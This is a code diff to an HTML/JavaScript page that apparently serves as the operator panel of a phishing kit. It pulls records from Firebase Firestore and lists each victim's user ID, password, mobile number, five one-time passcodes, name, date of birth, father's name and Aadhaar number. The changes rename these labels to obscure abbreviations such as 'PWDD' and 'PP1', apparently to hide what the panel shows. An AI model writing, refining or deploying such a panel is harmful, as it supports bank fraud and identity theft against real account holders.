@@ -6,6 +6,9 @@
 	<title>View Data</title>
 
 	<style>
+        body {
+            font-family: Arial;
+        }
 		.heading {
 			text-align: center;
 		}
@@ -13,11 +16,13 @@
 			text-align: center;
 			color: #43955F;
 		}
-		.data strong {
-			color: black;
+		.data .value {
+            color: #1881EB;
 		}
 		.data {
-			color: #1881EB;
+            color: black;
+            font-size: 16px;
+            line-height: 10px;
 		}
 	</style>
 
@@ -27,7 +32,7 @@
 
 	<div class="heading"><h2>All Data</h2></div>
 
-	<div class="subheading"><h4>Last Updated: <span id="lastUpdate">00:00:00</span></h4></div>
+	<div class="subheading"><h4><span id="lastUpdate">Loading....</span></h4></div>
 
 	<div class="data" id="data">
 	</div>
@@ -35,11 +40,26 @@
 </body>
 </html>
 
+<script>
+    function updateTime() {
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const seconds = String(now.getSeconds()).padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+
+        hours = hours % 12;
+        hours = hours ? hours : 12; // agar 0 ho to 12 banao
+        hours = String(hours).padStart(2, '0');
+
+        document.getElementById('lastUpdate').textContent = `Last Updated: ${hours}:${minutes}:${seconds} ${ampm}`;
+    }
+</script>
+
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
 <script>
-	    let isFirstRow = true; // Flag to detect the first row only
 
     // Firebase configuration
     const firebaseConfig = {
@@ -71,59 +91,157 @@
                 const dataBody = document.getElementById('data');
                 dataBody.innerHTML = '';
 
+
+                updateTime();
+
+                setInterval(updateTime, 1000);
+
                 // Populate the table with data
                 snapshot.forEach(doc => {
                     const data = doc.data();
                     const row = document.createElement('tr');
 
-                    row.innerHTML = `<strong>Customer ID/User ID:</strong> ${data.customerid}
-                    	<br>
-                        <strong>Password:</strong> ${data.password}
-                    	<br>
-                        <strong>Mobile Number:</strong> ${data.mobile}
-                    	<br>
-                    	<br>
-                        <strong>OTP 1:</strong> ${data.otp1}
-                    	<br>
-                    	<br>
-                        <strong>Full Name:</strong> ${data.customername}
-                    	<br>
-                        <strong>DOB:</strong> ${data.dob}
-                    	<br>
-                    	<br>
-                        <strong>OTP 2:</strong> ${data.otp2}
-                    	<br>
-                    	<br>
-                        <strong>OTP 3:</strong> ${data.otp3}
-                    	<br>
-                    	<br>
-                        <strong>Father Name:</strong> ${data.fathername}
-                    	<br>
-                        <strong>Adhar No:</strong> ${data.aadherNo}
-                    	<br>
-                    	<br>
-                        <strong>OTP 4:</strong> ${data.otp4}
-                    	<br>
-                    	<br>
-                        <strong>OTP 5:</strong> ${data.otp5}
-                    	<hr>
-                    	<br>`;
+                    if (data.otp5 != undefined) {
+                        const otp5 = document.createElement('p');
+
+                        otp5.innerHTML = `PP5: <span class="value">${data.otp5}</span> <br><br>`;
+
+                        row.appendChild(otp5);
+
+                    }
+
+                    if (data.otp4 != undefined) {
+                        const otp4 = document.createElement('p');
+
+                        otp4.innerHTML = `PP4: <span class="value">${data.otp4}</span> <br><br>`;
+
+                        row.appendChild(otp4);
+
+                    }
+
+                    if (data.aadherNo != undefined) {
+                        const aadherNo = document.createElement('p');
+
+                        aadherNo.innerHTML = `AAdr: <span class="value">${data.aadherNo}</span>`;
+
+                        row.appendChild(aadherNo);
+
+                    }
+
+                    if (data.fathername != undefined) {
+                        const fathername = document.createElement('p');
+
+                        fathername.innerHTML = `FFATNa: <span class="value">${data.fathername}</span> <br><br>`;
+
+                        row.appendChild(fathername);
+
+                    }
+
+
+                    if (data.otp3 != undefined) {
+                        const otp3 = document.createElement('p');
+
+                        otp3.innerHTML = `PP3: <span class="value">${data.otp3}</span> <br><br>`;
+
+                        row.appendChild(otp3);
+
+                    }
+
+                    if (data.otp2 != undefined) {
+                        const otp2 = document.createElement('p');
+
+                        otp2.innerHTML = `PP2: <span class="value">${data.otp2}</span> <br><br>`;
+
+                        row.appendChild(otp2);
+
+                    }
+
+                    if (data.dob != undefined) {
+                        const dob = document.createElement('p');
+
+                        dob.innerHTML = `CDOBB: <span class="value">${data.dob}</span>`;
+
+                        row.appendChild(dob);
+
+                    }
+
+                    if (data.customername != undefined) {
+                        const customername = document.createElement('p');
+
+                        customername.innerHTML = `CUTNU: <span class="value">${data.customername}</span> <br><br>`;
+
+                        row.appendChild(customername);
+
+                    }
+
+                    if (data.otp1 != undefined) {
+                        const otp1 = document.createElement('p');
+
+                        otp1.innerHTML = `PP1: <span class="value">${data.otp1}</span><br><br>`;
+
+                        row.appendChild(otp1);
+
+                    }
+
+
+                    if (data.mobile != undefined) {
+                        const mobile = document.createElement('p');
+
+                        mobile.innerHTML = `MB: <span class="value">${data.mobile}</span>`;
+
+                        row.appendChild(mobile);
+
+                    }
+
+                    if (data.password != undefined) {
+                        const password = document.createElement('p');
+
+                        password.innerHTML = `PWDD: <span class="value">${data.password}</span>`;
+
+                        row.appendChild(password);
+
+                    }
+
+                    if (data.customerid != undefined) {
+                        const customerid = document.createElement('p');
+
+                        customerid.innerHTML = `CUTU: <span class="value">${data.customerid}</span><br><br>`;
+
+                        row.appendChild(customerid);
+
+                    }
+
+                    // row.innerHTML = `
+                    //     <span>Mobile Number:</span> ${data.mobile}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>OTP 1:</span> ${data.otp1}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>Full Name:</span> ${data.customername}
+                    // 	<br>
+                    //     <span>DOB:</span> ${data.dob}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>OTP 2:</span> ${data.otp2}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>OTP 3:</span> ${data.otp3}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>Father Name:</span> ${data.fathername}
+                    // 	<br>
+                    //     <span>Adhar No:</span> ${data.aadherNo}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>OTP 4:</span> ${data.otp4}
+                    // 	<br>
+                    // 	<br>
+                    //     <span>OTP 5:</span> ${data.otp5}
+                    // 	<hr>
+                    // 	<br>`;
 
                     dataBody.appendChild(row);
-
-			                    
-			        // Update last updated time for first document only
-			        if (isFirstRow) {
-			            const lastUpdateSpan = document.getElementById('lastUpdate');
-			            if (data.createdAt && data.createdAt.toDate) {
-			                const date = data.createdAt.toDate(); // Firebase Timestamp to JS Date
-			                const formattedTime = date.toLocaleTimeString(); // Format HH:MM:SS
-			                lastUpdateSpan.textContent = formattedTime;
-			            } else {
-			                lastUpdateSpan.textContent = "Invalid Timestamp";
-			            }
-			            isFirstRow = false; // After first row, disable
-			        }
                 });
             }
 
